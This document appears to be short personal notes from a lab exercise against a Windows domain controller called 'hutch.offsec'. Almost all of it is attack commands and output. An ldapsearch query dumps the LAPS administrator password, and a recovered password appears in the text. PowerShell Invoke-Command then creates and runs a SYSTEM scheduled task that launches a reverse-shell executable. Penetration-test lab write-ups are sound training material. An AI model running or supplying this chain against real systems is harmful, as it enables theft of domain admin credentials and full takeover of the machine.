
```
dir "C:\Program Files"
```

`LAPS`

```bash - kali
ldapsearch -v -x -D <USER>@<HOSTNAME>.<DOMAIN> -w <PASSWORD> -b 
"DC=<HOSTNAME>,DC=<DOMAIN>" -h $TARGET "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
```


```
# HUTCHDC, Domain Controllers, hutch.offsec
dn: CN=HUTCHDC,OU=Domain Controllers,DC=hutch,DC=offsec
ms-Mcs-AdmPwd: Q4yzT+2-BiTBlF
```

`Q4yzT+2-BiTBlF`

```powershell - windows
powershell
```

Use found password from above here.

```powershell - windows
$pw = ConvertTo-SecureString "Q4yzT+2-BiTBlF" -AsPlainText -Force
```

```powershell - windows
$creds = New-Object System.Management.Automation.PSCredential ("Administrator", $pw)
```

Make sure the path to reverse.exe is correct below.

```powershell - windows
Invoke-Command -Computer hutchdc -ScriptBlock { schtasks /create /sc onstart /tn shell /tr C:\Windows\Temp\Tools\reverse64.exe /ru SYSTEM } -Credential $creds
```

![[1._rlwrap]]

SUCCESS: The scheduled task "shell" has successfully been created.

```powershell - windows
Invoke-Command -Computer hutchdc -ScriptBlock { schtasks /run /tn shell } -Credential $creds
```

SUCCESS: Attempted to run the scheduled task "shell".
